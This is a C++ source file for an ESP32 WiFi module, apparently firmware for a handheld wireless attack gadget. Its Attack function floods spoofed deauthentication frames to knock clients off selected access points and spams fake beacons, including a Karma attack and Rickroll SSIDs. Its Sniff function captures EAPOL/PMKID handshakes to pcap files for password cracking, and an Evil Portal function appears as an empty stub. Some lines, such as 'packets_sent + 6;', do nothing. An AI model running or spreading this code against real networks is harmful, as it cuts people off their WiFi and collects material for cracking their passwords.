#include "wifi_module.h"
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <Arduino.h>
#include "callbacks.h"

String WiFiModule::freeRAM()
{
  char s[150];
  sprintf(s, "RAM Free: %u bytes", esp_get_free_heap_size());
  return String(s);
}

void WiFiModule::insertTimestamp(uint8_t *packet)
{
  struct timeval now;
  gettimeofday(&now, NULL);

  uint64_t timestamp = (uint64_t)now.tv_sec * 1000000 + now.tv_usec;


  for (int i = 0; i < 8; i++) {
      packet[24 + i] = (timestamp >> (i * 8)) & 0xFF;
  }
}

void WiFiModule::insertWPA2Info(uint8_t *packet, int ssidLength) {
    int start = 36 + ssidLength + 2 + 8;


    uint8_t rsnInfo[] = {
        0x30, 0x14, // Element ID and Length for RSN (WPA2) IE
        0x01, 0x00, // RSN Version 1
        0x00, 0x0F, 0xAC, 0x04, // Group Cipher Suite: AES (CCMP)
        0x01, 0x00, // Pairwise Cipher Suite Count: 1
        0x00, 0x0F, 0xAC, 0x04, // Pairwise Cipher Suite: AES (CCMP)
        0x01, 0x00, // AKM Suite Count: 1
        0x00, 0x0F, 0xAC, 0x02, // AKM Suite: PSK
        0x00, 0x00 // RSN Capabilities
    };

    for (int i = 0; i < sizeof(rsnInfo); i++) {
        packet[start + i] = rsnInfo[i];
    }
}

int WiFiModule::generateSSIDs(int count) {
  uint8_t num_gen = count;
  for (uint8_t x = 0; x < num_gen; x++) {
    String essid = "";

    for (uint8_t i = 0; i < 6; i++)
      essid.concat(alfa[random(65)]);

    ssid s = {essid, random(1, 12), {random(256), random(256), random(256), random(256), random(256), random(256)}, false};
    ssids->add(s);
    Serial.println(ssids->get(ssids->size() - 1).essid);
  }

  return num_gen;
}

String WiFiModule::getApMAC()
{
  char *buf;
  uint8_t mac[6];
  char macAddrChr[18] = {0};
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_NULL);
  esp_wifi_start();
  esp_err_t mac_status = esp_wifi_get_mac(WIFI_IF_AP, mac);
  this->wifi_initialized = true;
  sprintf(macAddrChr, 
          "%02X:%02X:%02X:%02X:%02X:%02X",
          mac[0],
          mac[1],
          mac[2],
          mac[3],
          mac[4],
          mac[5]);
  this->shutdownWiFi();
  return String(macAddrChr);
}

bool WiFiModule::shutdownWiFi() {
  if (this->wifi_initialized) {
    this->wifi_initialized = false; // Stop all other while loops first
    esp_wifi_set_promiscuous(false);
    WiFi.disconnect();
    WiFi.mode(WIFI_OFF);

    dst_mac = "ff:ff:ff:ff:ff:ff";

    esp_wifi_set_mode(WIFI_MODE_NULL);
    esp_wifi_stop();
    esp_wifi_restore();
    esp_wifi_set_promiscuous_rx_cb(NULL); // fixes callback from being called still
    return true;
  }
  else {
    return false;
  }
}

bool WiFiModule::addSSID(String essid) {
  ssid s = {essid, random(1, 12), {random(256), random(256), random(256), random(256), random(256), random(256)}, false};
  ssids->add(s);
  Serial.println(ssids->get(ssids->size() - 1).essid);

  return true;
}

void WiFiModule::Sniff(SniffType Type, int TargetChannel)
{
#ifdef OLD_LED
  Threadinfo.TargetPin = rgbmodule->redPin;
#endif


  bool SetChannel = TargetChannel != 0;
  int set_channel = TargetChannel == 0 ? random(1, 13) : TargetChannel;
  if (MostActiveChannel != 0)
  {
    set_channel = MostActiveChannel;
  }
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_AP);

  esp_err_t err;
  wifi_config_t conf;
  err = esp_wifi_set_protocol(WIFI_IF_AP, WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N | WIFI_PROTOCOL_LR);

  esp_wifi_get_config((wifi_interface_t)WIFI_IF_AP, &conf);
  conf.ap.ssid[0] = '\0';
  conf.ap.ssid_len = 0;
  conf.ap.channel = set_channel;
  conf.ap.ssid_hidden = 1;
  conf.ap.max_connection = 0;
  conf.ap.beacon_interval = 60000;
  err = esp_wifi_set_config((wifi_interface_t)WIFI_IF_AP, &conf);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&filt);

  esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);

  this->wifi_initialized = true;
  initTime = millis();

 switch (Type)
  {
    case SniffType::ST_beacon:
    {
      
      esp_wifi_set_promiscuous_rx_cb(&beaconSnifferCallback);
#ifdef SD_CARD_CS_PIN
      sdCardmodule->startPcapLogging("BEACON.pcap");
#endif
      break;    
    }
    case SniffType::ST_pmkid:
    {
      esp_wifi_set_promiscuous_rx_cb(&eapolSnifferCallback);
#ifdef SD_CARD_CS_PIN
      sdCardmodule->startPcapLogging("EAPOL.pcap");
#endif
     break;
    }
    case SniffType::ST_probe:
    {
      esp_wifi_set_promiscuous_rx_cb(&probeSnifferCallback);
#ifdef SD_CARD_CS_PIN
      sdCardmodule->startPcapLogging("PROBE.pcap");
#endif
     break;
    }
    case SniffType::ST_pwn:
    {
      esp_wifi_set_promiscuous_rx_cb(&pwnSnifferCallback);
#ifdef SD_CARD_CS_PIN
      sdCardmodule->startPcapLogging("PWN.pcap");
#endif
      break;
    }
    case SniffType::ST_raw:
    {
      esp_wifi_set_promiscuous_rx_cb(&rawSnifferCallback);
#ifdef SD_CARD_CS_PIN
      sdCardmodule->startPcapLogging("RAW.pcap");
#endif
      break;
    }
  }
  
  static unsigned long lastChangeTime = 0;
  while (wifi_initialized)
  {
    if (Serial.available() > 0)
    {
      shutdownWiFi();
#ifdef SD_CARD_CS_PIN
      sdCardmodule->stopPcapLogging();
#endif
      break;
    }
    unsigned long currentTime = millis();
    if (currentTime - lastChangeTime >= 3000 && MostActiveChannel == 0)
    {
      if (!SetChannel)
      {
        uint8_t set_channel = random(1, 13);
        esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
      }
      lastChangeTime = currentTime;
      BreatheTask();
#ifdef NEOPIXEL_PIN
      neopixelmodule->breatheLED(neopixelmodule->strip.Color(255, 0, 255), 1000, false);
#endif
    }
  }
}

void WiFiModule::Scan(ScanType type)
{
#ifdef OLD_LED
  Threadinfo.TargetPin = rgbmodule->greenPin;
#endif

  switch (type)
  {
    case ScanType::SCAN_AP:
    {
        delete access_points;
        access_points = new LinkedList<AccessPoint>();

        uint8_t set_channel = random(1, 12);

        esp_wifi_init(&cfg);
        esp_wifi_set_storage(WIFI_STORAGE_RAM);
        esp_wifi_set_mode(WIFI_MODE_NULL);
        esp_wifi_start();
        esp_wifi_set_promiscuous(true);
        esp_wifi_set_promiscuous_filter(&filt);
        esp_wifi_set_promiscuous_rx_cb(&apSnifferCallbackFull);
        esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
        this->wifi_initialized = true;
        initTime = millis();
        static unsigned long lastChangeTime = 0;

      while (wifi_initialized)
      {
        if (Serial.available() > 0)
        {
          shutdownWiFi();
          break;
        }
        unsigned long currentTime = millis();
        if (currentTime - lastChangeTime >= 3000)
        {
          uint8_t set_channel = random(1, 13);
          esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
          lastChangeTime = currentTime;
        }
      }

      break;

    }
    case ScanType::SCAN_STA:
    {
      delete stations;
      stations = new LinkedList<Station>();

      uint8_t set_channel = random(1, 12);

      esp_wifi_init(&cfg);
      esp_wifi_set_storage(WIFI_STORAGE_RAM);
      esp_wifi_set_mode(WIFI_MODE_NULL);
      esp_wifi_start();
      esp_wifi_set_promiscuous(true);
      esp_wifi_set_promiscuous_filter(&filt);
      esp_wifi_set_promiscuous_rx_cb(&stationSnifferCallback);
      esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
      this->wifi_initialized = true;
      initTime = millis();
      static unsigned long lastChangeTime = 0;

      while (this->wifi_initialized)
      {
        if (Serial.available() > 0)
        {
          shutdownWiFi();
          break;
        }
        unsigned long currentTime = millis();
        if (currentTime - lastChangeTime >= 3000)
        {
          uint8_t set_channel = random(1, 13);
          esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
          lastChangeTime = currentTime;
        }
      }

      break;
    }
  }
}

void WiFiModule::LaunchEvilPortal()
{
  
}

void WiFiModule::getMACatoffset(char *addr, uint8_t* data, uint16_t offset) {
  sprintf(addr, "%02x:%02x:%02x:%02x:%02x:%02x", data[offset+0], data[offset+1], data[offset+2], data[offset+3], data[offset+4], data[offset+5]);
}

int WiFiModule::ClearList(ClearType type)
{
  int num_cleared;

  switch (type)
  {
    case ClearType::CT_AP:
    {
      int num_cleared = access_points->size();
      access_points->clear();
      break;
    }
    case ClearType::CT_SSID:
    {
      num_cleared = ssids->size();
      ssids->clear();
      Serial.println("ssids: " + (String)ssids->size());
      break;
    }
    case ClearType::CT_STA:
    {
      num_cleared = stations->size();
      stations->clear();

      for (int i = 0; i < access_points->size(); i++)
        access_points->get(i).stations->clear();
      
     break;
    }
  }
  return num_cleared;
}

int WiFiModule::findMostActiveWiFiChannel() {
    int networkCount = WiFi.scanNetworks();
    Serial.println("Scan complete");
    
    if (networkCount == 0) {
        Serial.println("No networks found");
        return -1;
    }

    
    int channelCount[14] = {0};


    for (int i = 0; i < networkCount; ++i) {
        int channel = WiFi.channel(i);
        if (channel > 0 && channel < 14) {
            channelCount[channel]++;
        }
    }


    int mostActiveChannel = 1;
    int highestCount = channelCount[1];
    
    for (int i = 2; i < 14; ++i) {
        if (channelCount[i] > highestCount) {
            mostActiveChannel = i;
            highestCount = channelCount[i];
        }
    }

    Serial.print("Most active channel: ");
    Serial.println(mostActiveChannel);
    
    return mostActiveChannel;
}

void WiFiModule::Calibrate()
{
  int CalibratedChannel = findMostActiveWiFiChannel();

  if (CalibratedChannel != -1)
  {
    Serial.printf("Set Calibrated Channel to %i", CalibratedChannel);
    LOG_MESSAGE_TO_SD("Set Calibrated Channel to " + String(CalibratedChannel));
    MostActiveChannel = CalibratedChannel;
  }
  else
  {
    Serial.printf("Failed to Find Any Wifi Networks");
    LOG_MESSAGE_TO_SD("Failed to Find Any Wifi Networks");
  }
}

void WiFiModule::Attack(AttackType type)
{
#ifdef OLD_LED
  Threadinfo.TargetPin = rgbmodule->redPin;
#endif

  switch (type)
  {
    case AttackType::AT_Rickroll:
    {
      while (wifi_initialized)
      {
        if (Serial.available() > 0)
        {
          String message = Serial.readString();

          if (message.startsWith("stop"))
          {
            shutdownWiFi();
            break;
          }
        }
          for (int i = 0; i < 12; i++)
          {
              for (int x = 0; x < (sizeof(rick_roll)/sizeof(char *)); x++)
              {
                broadcastSetSSID(rick_roll[x], i);
              }
          }
          BreatheTask();
#ifdef NEOPIXEL_PIN
neopixelmodule->breatheLED(neopixelmodule->strip.Color(255, 0, 0), 300, false);
#endif
          delay(1);
      }
      break;
    }
    case AttackType::AT_RandomSSID:
    {
      while (wifi_initialized)
      {
        if (Serial.available() > 0)
        {
          String message = Serial.readString();

          if (message.startsWith("stop"))
          {
            shutdownWiFi();
            break;
          }
        }
        broadcastRandomSSID();
        BreatheTask();
        delay(1);
      }
      break;
    }
    case AttackType::AT_ListSSID:
    {
      while (wifi_initialized)
      {
        if (Serial.available() > 0)
        {
          String message = Serial.readString();

          if (message.startsWith("stop"))
          {
            shutdownWiFi();
            break;
          }
        }
        for (int x = 0; x < 12; x++)
        {
          for (int i = 0; i < ssids->size(); i++)
          {
            broadcastSetSSID(ssids->get(i).essid.c_str(), x);
          }
        }
        BreatheTask();
        delay(1);
      }
      break;
    }
    case AttackType::AT_DeauthAP:
    {
        while(wifi_initialized){
        if (Serial.available() > 0)
        {
          String message = Serial.readString();

          if (message.startsWith("stop"))
          {
            shutdownWiFi();
            break;
          }
        }
        for(int i = 0; i < access_points->size(); i++){
        AccessPoint ap = access_points->get(i);
        if (ap.selected) {
          for (int i = 0; i < ap.stations->size(); i++) {
            Station cur_sta = stations->get(ap.stations->get(i));
              for (int y = 0; y < 25; y++) {
                sendDeauthFrame(ap.bssid, ap.channel, cur_sta.mac);
              }
            }
          }
          BreatheTask();
        }
      }
      break;
    }
    case AT_Karma:
    {
      while (wifi_initialized)
      {
        if (Serial.available() > 0)
        {
          String message = Serial.readString();

          if (message.startsWith("stop"))
          {
            shutdownWiFi();
            break;
          }
        }
        for (int i = 0; i < 12; i++)
        {
          for (int x = 0; x < (sizeof(KarmaSSIDs)/sizeof(char *)); x++)
          {
            broadcastSetSSID(KarmaSSIDs[x], i);
          }
        }
        BreatheTask();
        delay(1);
      }
    }
  }
}

void WiFiModule::broadcastSetSSID(const char* ESSID, uint8_t channel) {
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

   
    for (int j = 0; j < 6; j++) {
        uint8_t rnd = random(256);
        for (int i = 0; i < 2; i++) {
            packet[10 + j + i * 6] = rnd;
        }
    }

    int ssidLen = strlen(ESSID);
    int fullLen = ssidLen;
    packet[37] = fullLen;

    // Insert the SSID
    for (int i = 0; i < ssidLen; i++)
        packet[38 + i] = ESSID[i];

    packet[50 + fullLen] = channel;

    uint8_t postSSID[13] = {
        0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, // Supported rates
        0x03, 0x01, channel // DSSS (Current Channel)
    };


    insertTimestamp(packet);

    for (int i = 0; i < 12; i++)
        packet[38 + fullLen + i] = postSSID[i];

    esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
    esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
    esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
    packets_sent + 6;
}

void WiFiModule::RunSetup()
{
  ap_config.ap.ssid_hidden = 1;
  ap_config.ap.beacon_interval = 10000;
  ap_config.ap.ssid_len = 0;
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_AP);
  esp_wifi_set_config(WIFI_IF_AP, &ap_config);
  esp_wifi_start();

  esp_wifi_set_promiscuous(true);

  ssids = new LinkedList<ssid>;
  wifi_initialized = true;
}

void WiFiModule::broadcastRandomSSID() {

  uint8_t set_channel = random(1,12); 
  esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
  delay(1);  

  // Randomize SRC MAC
  packet[10] = packet[16] = random(256);
  packet[11] = packet[17] = random(256);
  packet[12] = packet[18] = random(256);
  packet[13] = packet[19] = random(256);
  packet[14] = packet[20] = random(256);
  packet[15] = packet[21] = random(256);

  packet[37] = 6;
  
  
  
  packet[38] = alfa[random(65)];
  packet[39] = alfa[random(65)];
  packet[40] = alfa[random(65)];
  packet[41] = alfa[random(65)];
  packet[42] = alfa[random(65)];
  packet[43] = alfa[random(65)];
  
  packet[56] = set_channel;

  uint8_t postSSID[13] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, //supported rate
                      0x03, 0x01, 0x04 /*DSSS (Current Channel)*/ };


  insertTimestamp(packet);

    // Add everything that goes after the SSID
    for(int i = 0; i < 12; i++) 
      packet[38 + 6 + i] = postSSID[i];


    esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
    esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
    esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
    packets_sent + 6;
}

void WiFiModule::sendDeauthFrame(uint8_t bssid[6], int channel, uint8_t mac[6]) {
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  delay(1);
  
  // Build AP source packet
  deauth_frame_default[4] = mac[0];
  deauth_frame_default[5] = mac[1];
  deauth_frame_default[6] = mac[2];
  deauth_frame_default[7] = mac[3];
  deauth_frame_default[8] = mac[4];
  deauth_frame_default[9] = mac[5];
  
  deauth_frame_default[10] = bssid[0];
  deauth_frame_default[11] = bssid[1];
  deauth_frame_default[12] = bssid[2];
  deauth_frame_default[13] = bssid[3];
  deauth_frame_default[14] = bssid[4];
  deauth_frame_default[15] = bssid[5];

  deauth_frame_default[16] = bssid[0];
  deauth_frame_default[17] = bssid[1];
  deauth_frame_default[18] = bssid[2];
  deauth_frame_default[19] = bssid[3];
  deauth_frame_default[20] = bssid[4];
  deauth_frame_default[21] = bssid[5];      

  // Send packet
  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);

  packets_sent = packets_sent + 3;

  // Build AP dest packet
  deauth_frame_default[4] = bssid[0];
  deauth_frame_default[5] = bssid[1];
  deauth_frame_default[6] = bssid[2];
  deauth_frame_default[7] = bssid[3];
  deauth_frame_default[8] = bssid[4];
  deauth_frame_default[9] = bssid[5];
  
  deauth_frame_default[10] = mac[0];
  deauth_frame_default[11] = mac[1];
  deauth_frame_default[12] = mac[2];
  deauth_frame_default[13] = mac[3];
  deauth_frame_default[14] = mac[4];
  deauth_frame_default[15] = mac[5];

  deauth_frame_default[16] = mac[0];
  deauth_frame_default[17] = mac[1];
  deauth_frame_default[18] = mac[2];
  deauth_frame_default[19] = mac[3];
  deauth_frame_default[20] = mac[4];
  deauth_frame_default[21] = mac[5];      

  // Send packet
  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);

  packets_sent = packets_sent + 3;
}